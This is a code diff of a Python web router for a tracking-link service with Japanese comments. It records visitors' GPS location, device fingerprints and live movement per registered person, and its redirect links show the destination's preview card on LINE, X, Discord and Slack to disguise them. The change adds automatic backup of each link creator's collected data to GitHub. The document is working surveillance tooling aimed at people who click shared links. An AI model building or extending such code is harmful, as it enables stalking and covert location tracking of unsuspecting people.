@@ -1,17 +1,14 @@
 """追跡ルーター：リンク踏み（一瞬/ライブ/クイズ/識別/転送）・人物ごとの登録・追跡画面。
 
-v14:
-  ・転送を2モードに分割
-      redirect     … 即リダイレクト（位置情報を要求しない）
-      redirect_gps … 即リダイレクト（位置情報を取得してから移動）
-  ・転送スプラッシュに飛び先のOGPを埋める（LINE/X/Discord/Slack のカード表示用）
-  ・main._create_link を実行時に自動パッチ（redirect_gps を main.py 無改造で通す）
-  ・GPSありの転送は beacon 送信＋上限待ち。許可済みなら短く、未許可なら長く待つ
-  ・hold=0 は完全即302（GPSも取らない）
+v15:
+  ・収集データを必ず「リンク作成者のテナントDB」に保存し、その作成者単位で退避する
+      （_save_owner。作成時・ヒット時・座標時・設定変更時・削除時に発火）
+  ・ヒット退避は HIT_BACKUP_GAP 秒でデバウンス（既定 8 秒）して GitHub を叩きすぎない
+  ・redirect_gps を追跡リンクとして正式に扱う
 """
 from __future__ import annotations
 
-import os, re, json, random, string, time, html as _html, datetime as dt
+import os, re, json, random, string, time, threading, html as _html, datetime as dt
 from urllib.parse import quote, urljoin, urlsplit
 
 import requests
@@ -26,6 +23,7 @@ router = APIRouter()
 LIVE_IV_MIN, LIVE_IV_MAX = 5, 600
 TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
 LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
+HIT_BACKUP_GAP = float(os.getenv("HIT_BACKUP_GAP", "8"))
 
 GATE_EXTRA_DEFAULT = """・位置情報（GPS）を使用します
 ・カメラで映像、マイクで音声を記録します
@@ -257,15 +255,50 @@ def _now():
     return _m().now_iso()
 
 
-def _bind_owner(code):
+# ---------- 作成者テナントへの保存・退避 ----------
+
+_SAVE_LOCK = threading.Lock()
+_SAVE_AT = {}
+
+
+def _save_owner(owner, force=False):
+    """作成者のテナントを丸ごと退避する（収集データは既にそのテナントDBに在る）。
+
+    ヒット毎に叩くと重いので HIT_BACKUP_GAP 秒でデバウンスする。
+    force=True はデバウンスを無視（作成・削除など取りこぼしたくない操作）。
+    """
+    if not owner:
+        return
+    key = (owner or "").lower()
+    now = time.time()
+    with _SAVE_LOCK:
+        if not force and now - _SAVE_AT.get(key, 0.0) < HIT_BACKUP_GAP:
+            return
+        _SAVE_AT[key] = now
+    try:
+        persist.push_user(owner, force=True)
+    except Exception as e:
+        try:
+            persist._us(owner)["err"] = repr(e)
+        except Exception:
+            pass
+
+
+def _save_owner_bg(owner, force=False):
+    threading.Thread(target=_save_owner, args=(owner,),
+                     kwargs={"force": force}, daemon=True).start()
+
+
+def _bind_owner(code, save=True):
     owner = users.owner_of_link(code)
     if not owner:
         return None
     tenancy.set_current(owner)
-    try:
-        persist.touch(owner, interval=persist.cfg()["every_hit"])
-    except Exception:
-        pass
+    if save:
+        try:
+            persist.touch(owner, interval=persist.cfg()["every_hit"])
+        except Exception:
+            pass
     return owner
 
 
@@ -463,13 +496,16 @@ def _quiz_rows(code):
 
 @router.get("/l/{code}")
 def link_hit(code: str, request: Request):
-    if not _bind_owner(code):
+    owner = _bind_owner(code, save=False)
+    if not owner:
         return PlainTextResponse("リンクが無効です", status_code=404)
     link = db.link_get(code)
     if not link or not link["active"]:
         return PlainTextResponse("リンクが無効です", status_code=404)
     L = live_cfg()
     hid = _record_hit(request, code)
+    # 収集データは作成者のテナントDBに入ったので、その作成者を退避する
+    _save_owner_bg(owner)
 
     try:
         from . import notify
@@ -548,7 +584,8 @@ _HIT_NUM = ("cores", "mem", "touch", "tzoff", "fonts_n", "battery", "charging",
 
 @router.post("/l/{code}/x")
 async def link_extra(code: str, request: Request):
-    if not _bind_owner(code):
+    owner = _bind_owner(code)
+    if not owner:
         return {"ok": False}
     try:
         body = await request.json()
@@ -618,12 +655,14 @@ async def link_extra(code: str, request: Request):
                             last_lon=trow["lon"], last_acc=trow["acc"],
                             last_city=trow["city"], last_ip=trow["ip"],
                             last_src=trow["src"], points=int(link["points"] or 0) + 1)
+    _save_owner_bg(owner)
     return {"ok": True, "vid": vid}
 
 
 @router.post("/l/{code}/p")
 async def link_point(code: str, request: Request):
-    if not _bind_owner(code):
+    owner = _bind_owner(code)
+    if not owner:
         return {"ok": 0, "why": "noowner"}
     link = _get_track(code)
     if not link or not link["active"]:
@@ -683,6 +722,8 @@ async def link_point(code: str, request: Request):
     db.track_update(code, **fields)
     if n and (int(link["points"] or 0) % 500) < n:
         db.prune_points(code, keep=TRACK_KEEP)
+    if n:
+        _save_owner_bg(owner)
 
     return {"ok": 1, "n": n, "iv": _clamp_iv(link["interval"]), "server": _now()}
 
@@ -842,6 +883,8 @@ def tracks_add(request: Request, person: str = Form(""), mode: str = Form("geo")
         users.register_link(code, u)
     except Exception:
         pass
+    # 作ったリンク自体を即バックアップ（作成者の meta.json に code が載る）
+    _save_owner(u, force=True)
     if mode == "quiz":
         return RedirectResponse(f"/link/{code}/questions?new=1", status_code=303)
     return RedirectResponse(f"/track/{code}?new=1", status_code=303)
@@ -908,6 +951,7 @@ def track_person_name(request: Request, code: str, vid: str = Form(""),
             db.set_visitor_label(vid, (name or "").strip()[:40], "")
         except Exception:
             pass
+    _save_owner(u)
     if back:
         return RedirectResponse(f"/track/{code}?v={quote(back)}", status_code=303)
     return RedirectResponse(f"/track/{code}", status_code=303)
@@ -932,12 +976,14 @@ def track_update_route(request: Request, code: str, person: str = Form(""),
     if active in ("0", "1"):
         f["active"] = int(active)
     db.track_update(code, **f)
+    _save_owner(u, force=True)
     return RedirectResponse(f"/track/{code}", status_code=303)
 
 
 @router.post("/track/{code}/clear")
 def track_clear(request: Request, code: str, u=Depends(auth)):
     db.clear_points(code)
+    _save_owner(u, force=True)
     return RedirectResponse(f"/track/{code}", status_code=303)
 
 
@@ -948,4 +994,5 @@ def track_delete(request: Request, code: str, u=Depends(auth)):
         users.unlink_owner(code)
     except Exception:
         pass
+    _save_owner(u, force=True)
     return RedirectResponse("/tracks", status_code=303)
